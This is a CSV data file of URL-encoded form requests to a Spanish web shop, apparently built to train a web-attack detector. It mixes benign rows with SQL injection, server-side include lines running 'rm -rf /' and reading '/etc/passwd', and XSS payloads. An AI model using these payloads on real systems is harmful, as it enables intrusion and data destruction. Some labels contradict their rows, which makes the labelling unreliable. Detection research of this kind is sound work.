payload,attack_type,label
modo=insertar&precio=587&B1=Confirmar%2F,cmdi,1
id=3&nombre=Vino+Rioja&precio=100&cantidad=84&B1=A%F1adir+al+carrito,normal,0
b2=vaciar+carrito,normal,0
B2=Vaciar+carrito123,normal,0
B2=Vaciar+carrito,normal,0
b2=vaciar+carrito,normal,0
modo=registro&login=tat7&password=p0on57cia008nto&nombre=Camelia&apellidos=Zurita+Santander&email=diessl-claver%40tradedeficit.mz&dni=59059811C&direccion=Cal*l%2Be+Ovidio+S%2FN+12-G&ciudad=Escobar+de+Polendos&cp=18518&provincia=Burgos&ntc=2636619315022095&B1=Registrar,cmdi,1
errormsg=credenciales+incorrectas,normal,0
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Vino+Rioja&precio=39&cantidad=6&B1=A%F1adir+al+carrito123,sqli,1
modo=insertar&precio=2366&B1=Confirmar,normal,0
id=1,normal,0
modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=1949A&provincia=Navarra&ntc=9173328900592385&B1=Registrar,cmdi,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,sqli,1
modo=registro&login=jailyn&password=irado&nombre=S%E1ia&apellidos=Ar%EDn+Cantis%E1n&email=norring-fujikawa%40autoconstruccion.au&dni=95944263Q&direccion=Plza.+Salamanca+39%2C+&ciudad=Langa+del+Castillo&cp=50780&provincia=Le%F3n&ntc=2787973107257855&B1=Registrar,normal,0
modo=registro&login=schwenk&password=iNfINitIvO&nombre=Tarciano&apellidos=Varela+Pulido&email=strizhenova-boston%40hrmsl.kh&dni=36249511Q&direccion=Barrio+Vidal+132%2C+13%3FB&ciudad=Rubite&cp=50160&provincia=Zamora&ntcA=6295032148467406&B1=Registrar,cmdi,1
modo=registro&login=darbee&password=e9e142od6N%C1Mi63&nombre=Remigio&apellidos=Maquieira+San+Segundo&email=eure%40cafedeteatro.no&dni=86138285L&direccion=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&ciudad=Cubells&cp=31454&provincia=Alicante&ntc=0034994508490764&B1=Registrar,sqli,1
MODO=BOB%40%3cscrIPT%3eALERT%28pAROS%29%3c%2fSCRipt%3e.PAROSPROXY.ORG&LOGIN=BEASLEY&PWD=NARCISISMO&REMEMBER=OFF&b1=eNTRAR,xss,1
modo=entrar&login=callos&pwd=prof%c9tica&remember=off&b1=entrar,normal,0
id=1&nombre=Queso+Manchego&precioA=85&cantidad=22&B1=A%F1adir+al+carrito,cmdi,1
id=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&nombre=Vino+Rioja&precio=85&cantidad=63&B1=A%F1adir+al+carrito,sqli,1
modo=entrar&login=finney&pwd=DesCostill3r&remember=off&B1=Entrar,normal,0
b2a=vaciar+carrito,normal,1
modo=entrar&login=franklyn&pwd=BiRlocHo&remember=off&B1=Entrar,normal,0
B2=Vaciar+carrito123,normal,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=78&B1=A%F1adir+al+carrito,cmdi,1
modo=registro&login=dirienzo&password=HacEdOr&nombre=Geraldo&apellidosA=Turra+Clop%E9s&email=fang_lavanant%40infotek.gu&dni=39243664Y&direccion=Calle+Tres+Marias%2C+103+&ciudad=Uterga&cp=28980&provincia=Zaragoza&ntc=7982155754096924&B1=Registrar,cmdi,1
modo=entrar&login=skipp&pwd=bra3o&remember=paros%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar123,xss,1
modo=registro&login=ramnarin&password=o14ula2o&nombre=Fedelia&apellidos=Badia+M%F3nico&email=lenoir0%40ofertachina.fj%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&dni=34742926T&direccion=C%2F+Felipe+Oya+Rodriguez+56+12F&ciudad=Navalilla&cp=07048&provincia=Palencia&ntc=2677666876528376&B1=Registrar123,sqli,1
idA=2,normal,1
id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=37&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=capindal&password=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Jordana&apellidos=Elio+Ca%F1ella&email=langton%40espanolynegocios.bt&dni=68564130A&direccion=Monasterio+De+Alahon+49+11%3FC&ciudad=Armu%F1a+de+Almanzora&cp=34208&provincia=Salamanca&ntc=5080659370035908&B1=Registrar,sqli,1
modo=registro&login=ardis&password=ad5ma.sc9r&nombre=Teodosia&apellidos=Vil%E0+Francino&email=saprtich%40seramitex.sv&dni=07194416Q&direccion=Calle+Parc+Catalunya%2C+116+10-B&ciudad=Chodos%2FXodos&cp=47450&provincia=La+Rioja&ntc=7699839843015936&B1=Registrar,normal,0
id=1,normal,0
B2=Vaciar+carrito,normal,0
modo=registro&loginA=radick&password=T76F6li6&nombre=Tercero&apellidos=Muleiro&email=roope%40gesmahernan.kn&dni=54463358W&direccion=Ronda+Cervantes+146%2C+13%3FG&ciudad=Navacarros&cp=12225&provincia=Albacete&ntc=2464400659124948&B1=Registrar,cmdi,1
id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=69&B1=A%F1adir+al+carrito123,normal,0
modo=registro&login=amar&password=encallecer&nombre=Celedonio&apellidos=Compres+Manau&email=danielson%40bloodline.mc&dni=45415076N&direccion=Valladolid%2C+99+7A&ciudad=Borges+del+Camp%2C+Les&cp=50343&provincia=Salama%2Fnca&ntc=1817134739036015&B1=Registrar,cmdi,1
modo=registro&login=klasky&password=TEM.%E1TiCO&nombre=Licia&apellidos=Maeso+Comello&email=verrell.myral%40cafedeteatro.kh&dni=33908887X&direccion=Plaza+Pedro+Marcos%2C+145+&ciudad=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&cp=36700&provincia=C%E1diz&ntc=4984450191632548&B1=Registrar,sqli,1
MODO=INSERTAR&PRECIO=PAROS%2522%2520STYLE%3d%2522BACKGROUND%3aURL%28JAVASCRIPT%3aALERT%28%27pAROS%27%29%29&b1=pASAR+POR+CAJA,xss,1
id=3&nombre=Queso+Manchego&precio=85&cantidad=54%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=A%F1adir+al+carrito,sqli,1
modo=entrar&login=clifford&pwd=3Ube3A&remember=off&B1=Entrar,normal,0
MODO=ENTRAR&LOGIN=GIROUARD&PWD=dISGU5taD1%27%2c%270%27%2c%270%27%2c%270%27%29%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--&REMEMBER=OFF&b1=eNTRAR,sqli,1
errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E123,sqli,1
modo=entrar&login=wingrove&pwd=37m1%27o%2Cr%E13ea&remember=on&B1=Entrar,cmdi,1
B2=Vaciar+carrito,normal,0
B2=Vaciar+carrito,normal,0
errorMsg=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,sqli,1
modo=registro&login=samalot&password=7nGr5TA3ente&nombre=Heidi&apellidos=Gim%E9nez+Toneu&email=tuajeva%40aeag.ir&dni=09205053Q&direccion=Juan+Antonio+Simon+199%2C+&ciudad=Luena&cp=44561&provincia=Segovia&ntc=2473968960827836&B1=Registrar123,normal,0
B2A=Vaciar+carrito123,normal,1
errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--123,sqli,1
b2=%27%3bWAITFOR+DELAY+%270%3a0%3a15%27%3b--,sqli,1
errorMsg=Credenciales+incorrectas%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C123,sqli,1
id=1%3F,normal,1
modo=insertar&precio=1406&B1=Confirmar,normal,0
modo=insertar&precio=289&B1=Pasar+por+caja123,normal,0
id=3&nombre=Vino+Rioja&precio=85&cantidad=11&B1=A%F1adir+al+carrito,normal,0
modo=registro&login=delf&password=7aria22&nombre=Cris%F3logo&apellidos=Ezama+Ogaz&email=sinclair%40campanasextractoras.lc&dni=18914400M&direccion=Republica+Eslovaca+104%2C+1%3FA&ciudad=Bunyola&cp=04869&provincia=Baleares+%28Illes%29&ntc=7367769822480051&B1=Registrar,normal,0
